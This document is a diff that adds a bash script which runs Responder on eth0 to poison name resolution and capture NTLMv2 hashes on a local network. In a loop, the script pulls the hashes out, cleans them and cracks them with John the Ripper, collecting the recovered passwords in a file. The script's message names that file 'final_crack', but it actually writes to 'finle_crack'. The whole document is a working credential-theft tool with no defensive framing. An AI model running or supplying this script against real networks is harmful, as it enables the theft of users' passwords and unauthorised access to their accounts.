@@ -1,1 +1,10 @@
-j
+#!/bin/bash
+unbuffer responder -I eth0 -dw -v >>  hash &
+echo "cracked passwords will be saved to (final_crack)"
+while true ;do
+sleep 4
+cat hash | grep "NTLMv2 Hash" | awk  '{print $5}' >> .hash 
+sed -r "s/\x1B\[[0-9;]*[mK]//g" .hash >> .clean_hashes.txt
+john --format=netntlmv2  .clean_hashes.txt 2>/dev/null | grep -v Loaded | grep -v No | grep -v Remaining >> .Cracked_passwords
+cat .Cracked_passwords | sort -u > finle_crack
+done
